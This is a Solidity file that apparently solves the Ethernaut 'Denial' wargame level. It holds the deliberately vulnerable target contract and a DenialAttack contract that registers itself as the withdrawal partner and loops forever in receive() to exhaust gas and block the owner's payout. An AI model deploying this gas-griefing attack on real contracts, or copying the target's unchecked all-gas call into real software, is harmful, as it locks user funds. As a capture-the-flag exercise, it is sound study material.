// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
// https://goerli.etherscan.io/address/0x9371cafcdd7be9e3ac0da0bc66661a530639f3db
contract Denial {

    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value:amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] +=  amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }

}


contract DenialAttack
{
 
     Denial immutable denialaddress;

     constructor(address payable _denialaddress)
     {
         denialaddress = Denial(_denialaddress);
     }

     function attack() external 
     {
         denialaddress.setWithdrawPartner(address(this));
         denialaddress.withdraw();
     }

     function getbalance() external view returns(uint256)
     {
         return address(this).balance;
     }

     receive() external payable
     {
          while(true)
          {
             
          }
     }


}
